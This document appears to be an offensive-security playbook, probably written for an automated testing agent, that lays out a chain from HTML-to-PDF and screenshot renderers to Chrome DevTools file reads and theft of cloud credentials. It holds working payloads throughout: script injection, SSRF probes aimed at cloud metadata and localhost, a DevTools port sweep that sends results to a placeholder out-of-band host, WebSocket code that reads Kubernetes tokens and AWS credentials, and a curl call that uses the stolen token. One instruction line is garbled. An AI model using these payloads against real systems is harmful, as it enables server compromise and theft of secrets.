# Headless Chrome / CDP -> file read -> k8s & cloud creds (a high-yield RCE chain)

A high-yield server-side RCE primitive. Any server-side
**HTML-to-PDF, screenshot, thumbnail, "preview URL", print, or invoice/report
generator** is usually a headless Chromium (Puppeteer/Playwright), `wkhtmltopdf`,
`weasyprint`, or `PhantomJS`. Two things fall out of it: (1) the render context is
a **full SSRF and JS execution** engine, and (2) if Chrome was launched with
`--remote-debugging-port`, that port is a **local, unauthenticated
code/file-read API** you can reach from inside the render. The payoff is reading
`/var/run/secrets/kubernetes.io/serviceaccount/token`, `~/.aws/credentials`, or
`/proc/self/environ` — cluster/tenant blast radius. Grounded in public
headless-Chrome / DevTools-protocol research.

## Contents
- Step 1 — Get your markup into the renderer
- Step 2 — Prove SSRF from the render context
- Step 3 — Find the DevTools debug port
- Step 4 — Drive CDP over the WebSocket
- Step 5 — What to read (rung-1 proof targets)
- Step 6 — Escalate (new boundary, careful)
- Component CVEs (when the build is old)
- Oracle / evidence
- Safety

## Step 1 — Get your markup into the renderer

The renderer eats a URL, an HTML field, or a Markdown/rich-text field. Inject a
minimal probe and read the produced PDF/image/text back:

```html
<script>document.title = navigator.userAgent</script>
<img src=x onerror="document.body.innerText=navigator.userAgent">
<iframe src="https://<your-oob>/hit"></iframe>
```

- If the output PDF/screenshot shows `HeadlessChrome/<ver>` (or your OOB gets a
  hit) -> **JS executes server-side in Chrome. Proceed.**
- If it shows `wkhtmltopdf`/`weasyprint`/`PhantomJS` -> no CDP, but you still have
  SSRF + `file://` LFI (Step 5) and version-specific CVEs. `wkhtmltopdf` renders
  `<iframe src="file:///etc/passwd">` straight into the PDF.

Fingerprint the exact Chrome build for CVE work:
`<script>document.title=navigator.userAgent</script>` -> e.g.
`HeadlessChrome/77.0.3844.0` (old builds carry V8/renderer RCE CVEs).

## Step 2 — Prove SSRF from the render context

The render fetches subresources. Point it inward:

```html
<img src="http://169.254.169.254/latest/meta-data/">   <!-- IMDS reach -->
<iframe src="http://localhost:8080/"></iframe>          <!-- internal app -->
<script>fetch('http://localhost:9222/json/version').then(r=>r.text()).then(t=>document.title=t)</script>
```

If `/json/version` returns a JSON blob with `"Browser":"HeadlessChrome/..."` and a
`"webSocketDebuggerUrl"`, you found the DevTools port. If not, scan (Step 3).

## Step 3 — Find the DevTools debug port

Chrome's debug port is often `9222`, but hardened/randomised deployments bind a
high port. From inside the render, sweep the common range and localhost aliases:

```html
<script>
for (const p of [9222,9229,9230,9333,45000,30000,40000]) {
  fetch('http://localhost:'+p+'/json/version')
    .then(r=>r.ok && r.text().then(t=>navigator.sendBeacon('https://<oob>/p'+p, t)));
}
</script>
```

- Sweep the documented range **30000–50000** plus `9222/9229`.
- Try `localhost`, `127.0.0.1`, and `0.0.0.0` — Host validation differs per build.
- `/json` (list of targets) and `/json/version` (browser + WS URL) are the two
  endpoints you need.

`GET http://localhost:<port>/json` returns:

```json
[{"id":"<pageId>","type":"page","url":"about:blank",
  "webSocketDebuggerUrl":"ws://localhost:9222/devtools/page/<pageId>"}]
```

## Step 4 — Drive CDP over the WebSocket

Modern Chrome rejects a non-`localhost` `Host` header on the WS to block DNS
rebinding — **but you are already executing inside the page**, so a same-box
`new WebSocket('ws://localhost:<port>/devtools/page/<id>')` is accepted. Send CDP
commands as JSON frames.

Read a local file two ways — pick whichever the sink lets you exfiltrate:

**(a) `Page.navigate` + `Runtime.evaluate`** (best when you can read the page text
back into the output):

```javascript
const ws = new WebSocket('ws://localhost:9222/devtools/page/<pageId>');
ws.onopen = () => {
  ws.send(JSON.stringify({id:1, method:"Page.navigate",
    params:{url:"file:///var/run/secrets/kubernetes.io/serviceaccount/token"}}));
};
ws.onmessage = (m) => {
  // after load event fires:
  ws.send(JSON.stringify({id:2, method:"Runtime.evaluate",
    params:{expression:"document.body.innerText", returnByValue:true}}));
  // ship result.value to your OOB / render it into the PDF title
};
```

**(b) `Page.printToPDF`** — render the file:// page to a PDF and read the base64
back (works when only the produced PDF is returned to you):

```javascript
ws.send(JSON.stringify({id:1, method:"Page.navigate",
  params:{url:"file:///etc/passwd"}}));
ws.send(JSON.stringify({id:2, method:"Page.printToPDF", params:{}}));
// response.result.data = base64 PDF containing /etc/passwd
```

**GET-only bypass — `/json/new`.** If you can only issue simple GETs (SSRF, no WS),
`GET http://localhost:<port>/json/new?file:///etc/passwd` opens a new tab
navigated to the `file://` URL; then `GET /json` to grab its `webSocketDebuggerUrl`
and `Page.captureScreenshot`/`printToPDF` it. Newer builds disabled the GET form of
`/json/new`; fall back to the WS `Target.createTarget` + `Page.navigate`.

## Step 5 — What to read (rung-1 proof targets)

Read-only, non-mutating, exactly what an RCE report needs:

- `file:///etc/passwd` — canonical arbitrary-file-read proof.
- `file:///var/run/secrets/kubernetes.io/serviceaccount/token` — **k8s SA JWT**.
- `file:///var/run/secrets/kubernetes.io/serviceaccount/namespace` and `ca.crt`.
- `file:///proc/self/environ` — env vars, often DB URLs / secrets.
- `file:///proc/self/cgroup`, `file:///.dockerenv` — confirm container.
- `file:///root/.aws/credentials`, `file:///home/app/.aws/credentials`.
- `file:///app/.env`, the app's config, source (`file:///proc/self/cwd/...`).
- IMDS via the render's SSRF: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  (see `ssrf-to-rce.md`).

## Step 6 — Escalate (new boundary, careful)

The SA token is the RCE proof (arbitrary file read from a server-side renderer =
Critical). Exercising it is a **new boundary** — climb the ladder read-only:

```bash
# read-only "what can I do" — the get-caller-identity equivalent for k8s
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
```

- That returns your granted verbs/resources — proves scope without touching data.
- Reading secrets/other-tenant objects with the token = rung 3+ -> hand to
  `cloud-exploitation`, and ask d0x directly before executing rather than going beyond a scoped read.
- `~/.aws/credentials` / IMDS creds -> `cloud-exploitation`
  (`../../cloud-exploitation/references/iam-creds.md`), `aws sts get-caller-identity`
  only, then STOP. (`aws` CLI absent; **`boto3` (1.43.18) is installed and signs SigV4** — use `python3 -c "import boto3;..."`; first, or use boto3 (installed) which signs SigV4. The `SelfSubjectRulesReview` curl
  above needs nothing installed.)

## Component CVEs (when the build is old)

- `HeadlessChrome/77.x` and other old builds -> V8/renderer RCE CVEs (sandbox is
  usually off in server headless -> the renderer *is* the box).
- `pdf.js` old (e.g. 1.10.97 / CVE-2018-5158) -> JS injection into the viewer ->
  chain to the above.
- `wkhtmltopdf` (all versions) -> `<iframe src="file:///etc/passwd">` LFI, no CDP
  needed; also SSRF.
- OpenSearch/Elasticsearch **Reporting** plugins bundle a headless Chrome -> same
  chain via the report/PDF export.

## Oracle / evidence

- **Confirm:** the SA token / `/etc/passwd` contents appear in the returned PDF,
  screenshot, page text, or your OOB listener; `/json` returned a
  `webSocketDebuggerUrl`; `navigator.userAgent` = `HeadlessChrome/<ver>`.
- **Negative control:** a benign external URL renders normally (proves the sink is
  a live renderer, not a static stub).
- **State but do not do:** "the same primitive reads `/etc/shadow` and every
  secret on the node" — by inference, one file is enough.
- **Not a finding:** the renderer strips/sandboxes `file://` and localhost (many
  managed PDF services do — a benign external URL renders but `file://` and
  `localhost` are blocked); JS does not execute (static HTML sanitiser upstream).

## Safety

- Read-only files only; never write via the renderer, never take a shell.
- Do not read another tenant's data with the harvested SA/IAM token — prove scope
  with `SelfSubjectRulesReview` / `get-caller-identity` and hand off.
- Flag the SA token and any IAM/env creds you read for rotation.
- One representative file proves arbitrary read; do not sweep the filesystem.
